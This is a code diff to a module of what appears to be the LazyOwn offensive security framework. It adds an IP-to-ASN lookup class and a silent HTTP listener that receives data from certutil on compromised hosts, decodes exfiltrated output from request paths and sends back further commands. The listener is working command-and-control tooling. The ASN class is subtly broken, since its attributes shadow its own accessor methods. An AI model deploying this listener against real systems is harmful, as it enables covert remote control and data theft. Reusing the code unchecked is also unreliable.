@@ -22,10 +22,13 @@ import io
 import csv
 import sys
 import ssl
+import gzip
 import json
 import time
 import glob
 import shlex
+import shutil
+import bisect
 import pickle
 import signal
 import base64
@@ -51,6 +54,7 @@ from bs4 import BeautifulSoup
 from itertools import product
 from pykeepass import PyKeePass
 from libnmap.parser import NmapParser
+from netaddr import IPAddress, IPRange
 from libnmap.process import NmapProcess
 from impacket.dcerpc.v5 import transport
 from datetime import datetime, timedelta, date
@@ -2151,6 +2155,111 @@ for arg in arguments:
 if RUN_AS_ROOT:
     check_sudo()
 
+
+class MyServer(HTTPServer):
+    """
+    Custom HTTP server to handle incoming connections from certutil.
+    """
+    pass
+
+class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
+    """
+    Custom HTTP request handler to intercept and decode GET requests from certutil.
+    """
+    def log_request(self, *args, **kwargs):
+        return
+
+    def log_message(self, *args, **kwargs):
+        return
+
+    def do_GET(self):
+        global query_id
+        self.send_error(404)
+
+        with open('payload.json', 'r') as file:
+            data = json.load(file)
+        url = data.get('url', 'URL not found')
+        lhost = data.get('lhost', 'LHOST not found')
+        if query_id % 2 == 0:
+            output = self.path
+            if output != '/':
+                print(decode(output[1:]))
+            get_command(url, lhost)
+        query_id += 1
+
+class IP2ASN:
+    def __init__(self):
+        self.as_name = {}
+        self.as_country = {}
+        self.recs = []
+
+    def open_file(self, filename):
+        """Open and parse the IP-to-ASN file."""
+        with open(filename, 'rb') as f:
+            self.open_reader(f)
+
+    def open_reader(self, reader):
+        """Parse the reader stream, handling both regular and gzipped files."""
+        if reader.read(2) == b'\x1f\x8b':
+            reader.seek(0)
+            with gzip.open(reader, 'rb') as f:
+                self._parse_file(f)
+        else:
+            reader.seek(0)
+            self._parse_file(reader)
+
+    def _parse_file(self, reader):
+        """Parse the TSV data and load it into memory."""
+        for line in reader:
+            line = line.decode('utf-8').strip()
+            parts = line.split('\t')
+            if len(parts) < 5:
+                continue
+            start_ip, end_ip, asn, country, desc = parts[:5]
+
+            if desc == "Not routed":
+                continue
+
+            try:
+                asn = int(asn)
+            except ValueError:
+                continue
+
+            if asn not in self.as_name:
+                self.as_name[asn] = desc
+                self.as_country[asn] = country
+
+            try:
+                start_ip = IPAddress(start_ip)
+                end_ip = IPAddress(end_ip)
+                self.recs.append((start_ip, end_ip, asn))
+            except ValueError:
+                continue
+
+        self.recs.sort(key=lambda x: x[0])
+
+    def as_of_ip(self, ip):
+        """Return the ASN associated with the given IP address."""
+        ip = IPAddress(ip)
+        idx = bisect.bisect_left(self.recs, (ip, ip, 0))
+        return self._rec_index_has_ip(idx - 1, ip)
+
+    def _rec_index_has_ip(self, idx, ip):
+        """Check if the given index contains the IP."""
+        if idx < 0 or idx >= len(self.recs):
+            return 0
+        start_ip, end_ip, asn = self.recs[idx]
+        if start_ip <= ip <= end_ip:
+            return asn
+        return 0
+
+    def as_name(self, asn):
+        """Get the AS name by ASN."""
+        return self.as_name.get(asn, "Unknown")
+
+    def as_country(self, asn):
+        """Get the country by ASN."""
+        return self.as_country.get(asn, "Unknown")
 
 if __name__ == "__main__":
     print_error("This script is not for execute apart from LazyOwn Framework")
